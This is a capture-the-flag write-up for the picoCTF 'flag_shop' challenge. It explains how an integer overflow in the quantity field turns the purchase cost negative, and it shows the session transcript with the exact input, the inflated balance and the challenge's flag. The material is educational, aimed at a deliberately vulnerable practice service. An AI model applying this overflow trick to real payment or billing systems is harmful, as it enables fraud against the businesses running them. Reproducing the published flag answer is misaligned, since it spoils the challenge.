# flag_shop

## Description
> There's a flag shop selling stuff, can you buy a flag? Source. Connect with nc
> 2019shell1.picoctf.com 60851.

**Hints:**
- Two's compliment can do some weird things when numbers get really big!

**Points:** 300

## Solution
Looking at the source code of this problem, we see that we need to buy the 1337
flag but do not have enough money. All we can afford initially is the dummy
flags. The hint reveals that we can utilize an integer overflow exploit to trick
the game.


In C, the max value for an integer is 2147483647. Any number larger that this
will wrap around to a negative number. The solution is to get the total cost to
a negative number so that when it is subtracted from out account balance, the
two numbers will be added together! I chose the number 2147481000:


```
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
 2
 Currently for sale
 1. Defintely not the flag Flag
 2. 1337 Flag
 1
 These knockoff Flags cost 900 each, enter desired quantity
 2147481000

 The final cost is: -2383200

 Your current balance after transaction: 2384300

 Welcome to the flag exchange
 We sell flags

 1. Check Account Balance

 2. Buy Flags

 3. Exit

  Enter a menu selection
  2
  Currently for sale
  1. Defintely not the flag Flag
  2. 1337 Flag
  2
  1337 flags cost 100000 dollars, and we only have 1 in stock
  Enter 1 to buy one1
  YOUR FLAG IS: picoCTF{m0n3y_bag5_34c9a5f7}
```
